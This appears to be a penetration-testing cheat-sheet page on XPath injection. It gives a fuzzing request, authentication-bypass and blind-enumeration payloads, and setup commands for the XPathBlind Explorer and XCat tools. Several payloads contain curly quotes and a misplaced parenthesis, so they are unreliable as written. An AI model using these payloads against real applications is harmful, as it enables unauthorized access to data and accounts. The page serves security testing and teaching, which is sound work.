---
title: "XPath Injection"
description: "XPath Injection"
lead: "XPath Injection"
date: 2020-10-13T15:21:01+02:00
lastmod: 2020-10-13T15:21:01+02:00
draft: false
images: []
menu: 
  docs:
    parent: "prologue"
weight: 130
toc: true
---
XPathInjection can be achieved in a similar fashion to traditional SQL injection.


{{< alert icon="💡" text="You can change the commands in the scripts section of `./package.json`." >}}

## Manual Exploitation

### Parameter Fuzzing

Use commas or apostrophies to fuzz parameters

{{< btn-copy text="npm run start" >}}

```html
POST /vulnerable.php HTTP/1.1
Host: vuln.xpath.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: vuln.xpath.org
Connection: close
Referer: vuln.xpath.org
Upgrade-Insecure-Requests: 1

email=test@test_email.com'
```
### Simple Authentication Bypass 

If no input filtering takes place, the following bypass line can be attempted.  

{{< btn-copy text="testUsername’ or ‘a’=’a’ or ‘a’=’a" >}}

```bash
testUsername’ or ‘a’=’a’ or ‘a’=’a
```

### Testing True/False Conditions

If a paramter is vulnerbale to an XPath injection, attempt passing arguments to reveal if the application changes based on a true or false condition

{{< btn-copy text="testUsername’ or ‘a’=’a’ or ‘a’=’a" >}}

```bash
testUsername’ or ‘a’=’a’ or ‘a’=’a
```

### Enumerate XML Structure

Use the following commands to check if the requested character matches with the `n` character of the root element. Note that this will only work if the true/false condition indicates a difference between the two conditions. 

{{< btn-copy text="foo‘ or substring(name(/*[1],2,1)=’a ">}}

```bash
foo‘ or substring(name(/*[1],1,1)=’a
```

```bash
foo‘ or substring(name(/*[1],1,1)=’b
foo‘ or substring(name(/*[1],1,1)=’c
foo‘ or substring(name(/*[1],1,1)=’d  

... and so forth, then try the next character

foo‘ or substring(name(/*[1],2,1)=’a
```


## Tools 

### XPathBlind Explorer

XPathBlind Explorer is an archived windows binary executable that can run automatic blind xpath injections. The GUI is outdated but works nonetheless.  

Download the binary <a href="https://code.google.com/archive/p/xpath-blind-explorer/downloads">here</a>. 

#### Installing Wine

If your running in Kali Linux, you will need to use WINE, a Windows emulator for linux. Use the following commands to install WINE. 

{{< btn-copy text="sudo dpkg --add-architecture i386" >}}

```bash
sudo dpkg --add-architecture i386
```  
{{< btn-copy text="sudo apt-get update " >}}

```bash
sudo apt-get update 
```  
{{< btn-copy text="sudo apt-get install wine:i386" >}}

```bash
sudo apt-get install wine:i386
```  
{{< btn-copy text="sudo apt-get install wine-bin:i386" >}}

```bash
sudo apt-get install wine-bin:i386
```  

#### Launching XPathBlind Explorer with WINE

{{< btn-copy text="wine XPathBlindExplorer.exe" >}}

```bash
wine XPathBlindExplorer.exe
```  



### XCat 

Xcat is a command line tool for automated XPath injection. It can be downloaded <a href="https://github.com/orf/xcat">here</a>


While you can install it a few ways, I found it easiest to run through docker.  

{{< btn-copy text="docker run -it tomforbes/xcat --help" >}}

```html
docker run -it tomforbes/xcat --help
```  
